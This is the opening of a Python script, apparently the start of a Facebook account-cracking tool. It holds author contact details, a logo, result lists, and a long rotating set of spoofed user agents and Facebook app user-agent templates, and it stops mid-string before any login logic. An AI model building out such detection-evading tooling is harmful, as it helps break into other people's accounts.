#coding = utf-8
#This Script is Written by UMAIRJUTT
#Whatsapp : +923124795536
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    

\033[1;97m             ##       ##     ##  ######   
\033[1;90m             ##       ###   ### ##    ##  
\033[1;97m             ##       #### #### ##        
\033[1;90m             ##       ## ### ## ##   #### 
\033[1;97m             ##       ##     ## ##    ##  
\033[1;90m             ##       ##     ## ##    ##  
\033[1;97m             ######## ##     ##  ######   
                                      \033[1;90m(JUTTXKHAN)\033[1;97m
--------------------------------------------------
  Owner     :   AQIB X SHEBBI X ABDULLAH
  Github    :   https://github.com/JUTTBRAND
  Facebook  :   JUTTBRAND
  Version   :   [1.0]
  Status    :   [Free]
--------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "

umair_ua = random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v3299898286466298403 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6234256489753014411 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v2204420771223484638 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v9199699844918589293 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v2633607591074563949 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1198007879809311878 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v3480252511340555133 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8536509444421372259 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5704612605746565368 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v4671323873153662184 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1196013834301599952 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v3657124095186817984 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1108441933470899319 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5292311956287826919 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v67812400695133648 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6686389929728703074 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v631490263871580723 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4600009579832410790 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6147742901370386649 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2441119965052768489 t6281935149377429786","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8117912760119717762 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1409408712698510311 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2112646006464977023 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8180494505245553000 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7616587321132616374 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v444216033644984453 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6572769705364849620 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2075653609398128901 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v967015213266204671 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8024643592688530169 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v7626335858904453748 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5776418544491328582 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v891520208384840698 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v570898243181583704 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1623656463218688109 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v4631876086000678185 t6281935149377429786","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8062035331829056766 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4099347935771455928 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2343607118316398969 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4734588355995832615 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5441795813425168687 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v9125700971131521863 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6367912337188253801 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v448500702641099709 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4122916501658246118 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1719743722905470616 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4124387240201168330 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5879215819119282394 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v577373534173912527 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v785003718060944182 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6600587855886833660 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v259504485077305827 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5026676458590951343 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5648624458535458184 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1512143014663022231 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7797796342368706474 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1497342929915407384 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1773764920912242401 t6281935149377429786","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v3889956715851323045 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v3870209039942948994 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2011307522966409299 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v7931193960008205080 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v9126955837476687990 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1061472554209507225 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v9193343614824894592 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1268301635839060271 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v958109916514180924 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v4655315151308073021 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v3988523387014082693 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v2247780485774319845 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6553413590376980870 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v9192294867439274503 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6181882672017582005 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v7186358359999712722 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5175862159626165340 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8492524842890859237 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8371527620650592987 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4265472259705615039 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v532427068071549883 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v382708289558344757 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4796372489780935007 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7757445081782982409 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v3989347480696524377 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1843001583741325542 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v4862218352489078122 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8592996750826460274 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v83193062620966537 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1736152068098633494 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1961801823391753162 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6150991994917512592 t6281935149377429786","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v548544264750613623 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2549058571082382100 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1934089129711483644 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4264417255470638083 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6496901678098479256 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1888606223911984912 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5449438025212392507 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v3882722542632352126 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v316114639759620265 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7496656020576854806 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5052408804626111704 t1191530496833852085","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5405064736461876507 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1766139622214302029 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v2918512870146941552 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5586710638410098810 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v3376260093076126625 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1126296232773375071 t1236787695256497497","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v9104413547870095413 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v4917262799633959557 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1594705368613385754 t6281935149377429786","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4013612037634713584 t7898349382904460768","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5449119838491151002 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v5013625041667102482 t6331743126571670211","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v7093468230066528803 t3345461284722333977","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8015999116941934407 t7889551165227354132","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8412282109502866374 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v6110829982957680887 t4157550440124640339","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7446231254347771422 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6417345166522223743 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8617353853196703515 t4951733999716571247","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v2704456148876378948 t7607367907735283829","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v1247848724355249034 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v660526618084829025 t6205049005192687891",])

ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
#xxx =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.0,width=1280,height=800};FBLC/'+fblc+';FBCR/;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/'+fbca+';]"
#umair_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; V2131 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; ONEPLUS A6013 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; F803YM Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RONS31.267-94-3)","Dalvik/2.1.0 (Linux; U; Android 6.0; Note20+ Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002.G1)","Dalvik/2.1.0 (Linux; U; Android 9; Lenovo TB-8504F Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005D Build/RKQ1.210303.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2038 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; LG-H870 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; Optima 7 A102 3G TS7243PG Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BL150 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; A8P Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:c74a09cf-2e2f-4494-a948-5f5a01fcd349; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:be27f2fd-13ef-4eb9-8fcd-a2b48e2a17e9; tid:-; 